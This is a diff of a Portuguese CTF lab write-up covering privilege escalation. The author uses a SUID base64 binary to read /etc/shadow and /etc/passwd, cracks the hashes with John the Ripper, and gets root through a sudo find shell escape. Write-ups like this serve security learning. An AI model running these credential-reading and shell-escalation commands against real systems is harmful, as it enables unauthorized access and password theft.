@@ -40,18 +40,52 @@ Vemos alguns binários com SUID habilitado, que pode ser um vetor de ataque inte
 ### Truque
 Sabendo que a flag2 está no diretório root_flag, podemos usar o payload `LFILE=/home/root_flag/flag2.txt ; base64 "$LFILE" | base64 --decode` e ler o conteúdo do arquivo:
 
-![WhatsApp Image 2025-03-01 at 15 04 37](https://github.com/user-attachments/assets/81b836f4-6265-4a27-b6c6-13ab40722e26)
+![Img4](https://github.com/user-attachments/assets/81b836f4-6265-4a27-b6c6-13ab40722e26)
 
 Encontramos a flag2.
 
-### Escalação de privilégio
+## Escalação de privilégio
 
 Como esse é o objetivo da room, vamos seguir realizando a escalação de privilégios. Uma das formas de atingir esse objetivo, agora que sabemos que podemos ler arquivos retritos, é obtendo as hashes das senhas dos usuários.
 
 ### Obtenção das hashes
 
 Passwd:
-`LFILE=/etc/passwd ; base64 "$LFILE" | base64 --decode`
+`LFILE=/etc/passwd ; base64 "$LFILE" | base64 --decode > passwdcontent`
+
+![Img5](https://github.com/user-attachments/assets/7c2a9138-3ed9-401e-9afd-fe3627a63824)
 
 Shadow:
-`LFILE=/etc/shadow ; base64 "$LFILE" | base64 --decode`
+`LFILE=/etc/shadow ; base64 "$LFILE" | base64 --decode > shadowcontent`
+
+![Img6](https://github.com/user-attachments/assets/d2815c36-02ff-40f8-a45a-f852753ab4fb)
+
+Após obter o conteúdo dos dois arquivos, podemos copiar para nossa máquina de ataque (utilizei o Kali) e preparar um novo arquivo para utilização em conjunto com o [John the Ripper](https://www.openwall.com/john/).
+Para fazer isso, usamos o utiliário "unshadow":
+
+`unshadow passwdcontent shadowncontent > hashes.txt`
+
+com o arquivo preparado, vamos rodar a ferramenta:
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
+
+![Img7](https://github.com/user-attachments/assets/4e81d5cf-349f-4629-9ef5-ae92e542497e)
+
+Obtemos a senha do usuário 'nissy'. Vamos realizar a conexão via SSH com as credenciais desse usuário.
+### Nissy
+
+Analisando o .bash_history, vemos que a flag1 se encontra no diretório Documents.
+
+Executando o comando `sudo -l` para ver se esse usuário pode utilizar algum comando com privilégios elevados, e vimos que o comando `find` oferece essa opção.
+
+
+Novamente, checando o GTFIOBINS, podemos encontrar um payload para elevar o nível do nosso shell:
+
+`sudo find . -exec /bin/sh \; -quit`
+
+Após executar esse comando, recebemos uma shell com privilégios de root, e podemos ler o conteúdo da flag2.
+
+![Img8](https://github.com/user-attachments/assets/1ed6d4f9-2544-4553-91a7-9b671d442594)
+
+
+![Img9](https://github.com/user-attachments/assets/7d873376-5ed9-4dc4-9cef-66ccb42044cf)
